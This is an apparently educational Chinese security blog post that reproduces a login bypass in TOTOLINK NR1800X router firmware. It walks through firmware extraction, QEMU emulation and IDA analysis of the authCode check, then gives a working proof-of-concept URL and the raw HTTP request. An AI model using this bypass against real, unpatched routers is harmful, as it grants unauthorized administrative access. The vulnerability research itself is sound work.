---
title: 物联网学习——totolink登陆绕过漏洞
author: SecureNexusLab
date: 2024-06-15 10:57
cover: true
sidebar: []
readmore: true
tags: 
- 公众号推文
- 二进制安全
categories:
- 公众号推文
---

### 漏洞描述

TOTOLINK NR1800X V9.1.0u.6279_B20210910包含登录绕过漏洞，由于对topicurl的值进行处理，来实现不同函数接口的调用，其中对authCode鉴别存在缺陷，导致可以构造URL实现默认登录。

**漏洞类型**：登录绕过漏洞

**影响范围**：totolink	nr1800x 9.1.0u.6279_b20210910版本

**修复版本**：高于9.1.0u.6279_b20210910。

### 复现环境

固件下载地址：

https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/225/ids/36.html

固件信息：NR1800X_Firmware V9.1.0u.6279_B20210910

解压后使用binwalk提取.web文件中的文件系统

```bash
binwalk -Me TOTOLINK_C834FR-1C_NR1800X_IP04469_MT7621A_SPI_16M256M_V9.1.0u.6279_B20210910_ALL.web
```

### 模拟启动

先在操作系统中(ubuntu18.04)安装好qemu和其他工具。

```bash
sudo apt-get install qemu
sudo apt-get install qemu-user-static
sudo apt-get install qemu-system
sudo apt-get install uml-utilities
sudo apt-get install bridge-utils
```

安装完成之后，修改ubuntu系统主机的网络配置

详细的网络配置请参考：

https://blog.csdn.net/QQ1084283172/article/details/69378333

如果找不到br0，注意查看以下命令是否正常运行。

```bash
sudo ifdown ens32
sudo ifup br0
```

下载qemu需要用到的镜像和其他文件。下载地址：

https://people.debian.org/~aurel32/qemu/mips/



![images](/images/iot-totolink-sign-in-vuln/1.png)



将下载的文件都存放在在一个目录中，方便使用命令启动。然后启动qemu虚拟机。qemu虚拟机默认账密root:root

```
sudo qemu-system-mipsel -M malta -kernel mipsel-vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
```

虚拟机启动之后ifconfig查看ip地址，如果没有IP地址信息，需要手动进行设置

qemu虚拟机：

```
ifconfig eth0 192.168.102.200 netmask 255.255.255.0
```

ubuntu系统主机：

```
sudo ifconfig tap0 192.168.102.199 netmask 255.255.255.0
```

设置好IP之后，可以用ifconfig命令再次查看，然后使用ping 测试两台主机的通信。

将提取到的固件打包成tar文件，然后使用scp命令传到qemu虚拟机中

拷贝系统文件：

```
scp -r squashfs-root.tar  root@192.1.1.200:/root/

chmod -R 777 squashfs-root
mount -o bind /dev ./squashfs-root/dev/
mount -t proc /proc ./squashfs-root/proc/
chroot ./squashfs-root/ sh
```

我们还需要调起服务

```
./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf
```

访问目标网页

![images](/images/iot-totolink-sign-in-vuln/2.png)



### 漏洞分析

首先查看登录时的数据包，有两个关键数据包

第一个是登录的POST数据包
![images](/images/iot-totolink-sign-in-vuln/3.png)

漏洞分析首先查看登录时的数据包，有两个关键数据包第一个是登录的POST数据包

第二个是登录失败跳转的数据包
![images](/images/iot-totolink-sign-in-vuln/4.png)

使用IDA打开`/cgi-bin/cstecgi.cgi`文件，搜索`action=login`

![images](/images/iot-totolink-sign-in-vuln/5.png)

查看逆向后的代码

![images](/images/iot-totolink-sign-in-vuln/6.png)

格式化处理URL是为了便于后续数据的传递，如下图：

![images](/images/iot-totolink-sign-in-vuln/7.png)

接下来要调用相应函数

![images](/images/iot-totolink-sign-in-vuln/8.png)



接下来寻找目标有点麻烦，我们需要再搜索一下formLoginAuth.htm字符，进而跳转到sub_42AEEC函数中

![images](/images/iot-totolink-sign-in-vuln/9.png)



函数中包含对用户名和密码输入的获取处理，以及构造redirectURL的过程，其中有个关键词”authCode”

![images](/images/iot-totolink-sign-in-vuln/10.png)



我们还要对lighttpd文件进行逆向，并搜索authCode，发下如下代码，其中依次获取了参数值

![images](/images/iot-totolink-sign-in-vuln/11.png)

而后续对v7的处理上

![images](/images/iot-totolink-sign-in-vuln/12.png)

仅仅判断了v7是否存在就可以直接获取session_id，这也是漏洞发生的根本原因

### 漏洞复现

构造PoC：

```
http://192.168.102.200/formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login
```

原始流量数据包：

```
GET /formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login HTTP/1.1
Host: 192.168.102.200
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: SESSION_ID=2:1711291127:2
Upgrade-Insecure-Requests: 1
```

虽然相应包是302，但后续的数据包表明，重定向到了/basic/index.html中

Wireshark截图：

![images](/images/iot-totolink-sign-in-vuln/13.png)
